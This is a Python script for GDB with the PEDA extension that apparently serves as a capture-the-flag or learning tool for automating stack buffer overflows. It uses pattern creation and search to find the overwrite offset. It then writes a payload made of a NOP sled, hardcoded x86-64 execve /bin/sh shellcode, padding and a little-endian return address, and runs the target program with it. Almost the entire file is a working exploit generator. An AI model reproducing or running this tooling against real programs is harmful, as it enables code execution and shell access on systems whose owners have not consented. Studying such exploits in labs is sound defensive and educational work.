##To run the script use the command 'gdb *EXECUTABLENAME* -x ptest3.py' with both the executable and script in the same file path##

#Tells the code how large of a pattern to create
pattnum=10000

#Defines the number of nops used before the shellcode
nopnum=10

#Tells the program if the buffer overflow input is stdin or argv, set to True if argv
argv=True

#Tells the program if you want to execute shell code or jump to another function, True if function jumping
funcjump=False

#This runs the 'pattern create' function in gdb peda and the output is written to the pattern.txt file
pattern_out=peda.execute_redirect("pattern create "+str(pattnum)+" pattern.txt")

#This runs the executable with the command line argument of the pattern we just created
#The command is altered depending on the input type specified above
if argv==True:
	command="run $(cat pattern.txt)"
else:
	command="run < pattern.txt"
disout=gdb.execute(command,True, True)

#If we are executing shellcode we will want to know where the leave intruction before we segfault is
if funcjump==False:	
	disout=disout.splitlines()
	for i in range(len(disout)):
		if "leave" in disout[i]:
			leaveaddr=disout[i].split("<")[1].split(">")[0]
	print(leaveaddr)
	
#This run the 'pattern search' function in gdb peda and the output is stored in the search_out variable
search_out=gdb.execute("pattern search",True, True)
try:
	#The output of the pattern search is searched for the offset of the R/ESP this is stored in the offset variable
	offset=int((search_out.split("SP] --> offset ")[1]).split(" -")[0])
except Exception as l:
	print(l)
	#If the R/ESP is not found the overflow is not possible so the program is exited
	print("No overflow possible")
	quit()	
	
print(offset)

#This function writes the payload to a file
def file_write(addr):
	f= open("address.txt","wb")
	if funcjump==False:
		shellcode=b"\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x50\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
	else:
		shellcode=b""
		
	print(offset)

	print(shellcode)

	#The hex address is converted to a little endain bytearray
	hexbin=(addr).to_bytes(8,'little')
	
	#The payload is offset long always containing nopnum number of NOPs and the rest is either shellcode and As if funcjump is false or just As if it is true
	#Then the address we want to jump to in little endian is added at the end
	f.write(b"\x90"*nopnum+shellcode+b"A"*(offset-len(shellcode)-nopnum)+hexbin)
	f.close()

#This finds the shellcode address
if funcjump==False:
	#A breakpoint is set at the leave instruction before the segfault
	gdb.execute("b *"+leaveaddr,True,True)

	#Generates a pattern of offset+8 to get the correct rip value
	pattern_out=peda.execute_redirect("pattern create "+str(offset+8)+" pattern.txt")

	a=gdb.execute("r",True,True)
	ip=gdb.execute("x $rsp+16",True,True).split(":")[0]
	gdb.execute("d")

#This gets userinput of the address after printing the functions that the program uses
else:
	gdb.execute("info functions")
	badinp=1
	while badinp:
		try:
			#The user is asked for the address of the instruction
			print("Please enter the address of the instruction you would like to jump to: (to quit type 'q') ")
			ip=input()
			
			#If that instruction cannot be executed by the program an error message is displayed and the loop is started again
			if not peda.is_executable(int(ip,16)):
				print("address not executable")
				continue	
			else:
				break
		except:
			#Allows the user to exit the program
			if ip[0]=='q':
				print("Exiting")
				exit()
			print("Not a valid instruction address try again")

print(ip)
#Convert address to integer
address=int(ip,16)

#Remove Null Bytes from the end of an address
if ip[-1]=="0" and ip[-2]=="0":
	address+=1
	
file_write(address)

print("Trying to execute:")
#Augments the command again depeding on the input type
if argv==True:
	command="run $(cat address.txt)"
else:
	command="run < address.txt"
#The file is passed to the program and a buffer overflow is attempted
gdb.execute(command)
exit()
